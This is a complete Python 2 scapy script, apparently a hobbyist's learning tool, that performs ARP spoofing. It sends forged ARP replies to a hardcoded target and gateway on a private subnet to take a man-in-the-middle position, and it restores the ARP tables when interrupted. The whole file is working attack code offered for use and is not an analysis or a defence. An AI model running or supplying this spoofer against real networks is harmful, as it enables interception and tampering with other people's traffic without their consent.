#!/usr/bin/env python

# Created by un4ckn0wl3z-level99
# Website -> www.un4ckn0wl3z.xyz
# Date -> 7/22/2018

import scapy.all as scapy
import time
import sys


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=3, verbose=False)[0]
    return answered_list[0][1].hwdst


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = "192.168.233.129"
gateway_ip = "192.168.233.2"

try:
    sent_pk_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_pk_count = sent_pk_count + 2
        print "\r[+] Packets sent: " + str(sent_pk_count),
        sys.stdout.flush()
        time.sleep(1)
except KeyboardInterrupt:
    print "\n[+] Detected CTRL+C ..... Quitting."
    print "[+] Restore ARP Table."
    restore(gateway_ip, target_ip)
